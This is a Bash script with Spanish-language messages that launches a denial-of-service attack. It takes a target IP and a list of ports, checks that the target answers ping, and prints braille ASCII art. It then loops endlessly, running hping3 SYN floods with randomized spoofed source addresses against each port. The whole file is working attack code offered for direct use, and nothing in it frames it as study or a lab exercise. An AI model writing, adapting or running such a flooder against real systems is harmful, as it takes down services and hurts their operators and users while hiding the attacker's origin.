#! /usr/bin/env bash

RED='\033[38;5;196m' 
GREEN='\033[38;5;46m'
PURPLE='\033[38;5;165m'
BLUE='\033[38;5;50m'
NC='\033[0m'

info() { echo -e "${BLUE} [INFO]${NC} $*";}
success() { echo -e "${GREEN}[CHIDO]${NC} $*";}
warning() { echo -e "${PURPLE} [OJO PIOJO]${NC} $*";}
error() { echo -e "${RED} [ERROR]${NC} $*"; exit 1;}

IP_OBJETIVO=$1
PUERTOS_STR=$2

if [[ -z $IP_OBJETIVO ]]; then
	warning "La IP debe de ingresarse en el comando: bash script.sh {IP} {PUERTOS}"
	error "Ip no detectada"
fi

if [[ -z $PUERTOS_STR ]]; then
	warning "Los puertos deben de ingresarse en el comando: bash script.sh {IP} {PUERTOS}"
	error "Puertos no detectados"
fi

IFS=',' read -ra PUERTOS <<< "$PUERTOS_STR"


if ! command -v hping3 &>/dev/null; then
	error "ejecuta dnf install hping3 y vuelve a ejecutar"
fi

#Verificando que el servidor a atacar este encendido

PING_RESULT=$(ping -c 3 $IP_OBJETIVO 2>&1)

if echo "$PING_RESULT" | grep -q "0 received"; then
	error "Servidor no alcanzable: todos los paquetes perdidos"
fi

if echo "$PING_RESULT" | grep -q "Destination Host Unreachable"; then
	error "Servidor no alcanzable: dirección no alcanzable"
fi

info "Ataque iniciado al servidor $IP_OBJETIVO"

cat << 'EOF'
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡆⠀⢀⡀⣀⢀⡀⠀⠀⣀⢀⡀⣀⠀⢠⣿⣿⠏⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠯⠥⠤⢤⣉⣉⡉⠉⠉⠉⢩⣿⣿⣿⣾⠁⠀⠘⠿⣿⣷⣿⡇⠈⢀⣠⣽⣯⡸⣿⣿⣭⣳⠀⣀⣠⡤⠭⠟⠛⠛⠃⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣀⣤⡤⠴⣶⠶⣶⠶⠟⢛⣒⠿⠿⠿⠿⠿⠿⢿⣏⠙⠒⠒⠒⠒⠒⢹⡿⢛⣉⡄⠀⠀⠀⠀⢾⣿⣿⣷⡆⠀⠈⠏⣿⣿⣿⣿⡛⠟⡿⠿⠿⠿⠿⠿⣿⣿⣯⠀⠉⠉⡟⣽⢿⣿⠷⣾⣶⣶⣤⡤⣄⠀
⣯⣆⣤⣤⣴⠦⢤⣤⣤⣄⣉⠁⠈⠉⠉⠉⠒⠉⠁⠀⠀⠀⠀⢐⣀⢼⡿⢭⡇⠀⠀⣀⣠⣴⡿⢇⢈⣿⣿⣦⣄⣐⣤⣹⣿⣿⣿⣤⣿⡀⣀⡀⠀⠀⢀⣀⣀⣠⣤⣤⠤⢤⣴⣶⣿⣿⡿⠿⠿⠿⠛⠂
⠀⠀⠈⠋⠉⠙⠓⠒⠒⠒⠒⠛⠿⠷⠴⠤⠤⠤⠆⠠⠤⣄⣶⣤⡤⠌⠐⠋⠀⠐⠁⢸⣾⣿⣿⡿⢺⣿⣿⣿⣿⣧⣭⣛⣯⣽⣿⡷⣾⠿⠿⠿⠯⠭⠿⠗⠒⠚⠛⠛⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⡇⠀⡤⠚⠁⢰⣾⣿⣼⣾⣇⢸⣿⣿⣿⣿⣿⣯⡏⢿⣿⠻⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢴⣦⣤⣤⣭⣧⡟⡟⠻⡿⡟⢻⣿⣿⣿⣿⣿⣿⣯⣭⣭⣭⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣧⢀⠀⠀⠀⠀⠉⢹⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣮⠀⣢⠔⠊⡑⢸⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣁⣤⡘⢇⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
EOF

while true; do
	for PUERTO in "${PUERTOS[@]}"; do
		info "Atacando puerto $PUERTO..."
		timeout 10 hping3 -S -p $PUERTO --flood --rand-source $IP_OBJETIVO
	done
done


